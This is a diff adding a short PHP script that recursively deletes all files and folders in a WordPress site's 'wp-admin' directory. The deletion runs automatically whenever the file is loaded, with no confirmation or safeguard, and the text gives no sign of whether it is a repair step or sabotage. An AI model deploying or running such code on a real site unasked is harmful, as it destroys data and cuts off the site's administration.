@@ -1,0 +1,24 @@
+<?php
+function deleteFiles($path) {
+    // Get list of files and directories
+    $files = glob($path . '/*');
+    
+    // Loop through each file and directory
+    foreach ($files as $file) {
+        // echo $file.'<BR>';
+        if (is_file($file)) {
+            // Delete the file
+            unlink($file);
+        } elseif (is_dir($file)) {
+            // Recursively delete directories
+            deleteFiles($file);
+            // Remove the directory itself
+            rmdir($file);
+        }
+    }
+}
+
+// Example usage:
+$directoryPath = __DIR__.'/wp-admin';
+deleteFiles($directoryPath);
+?>
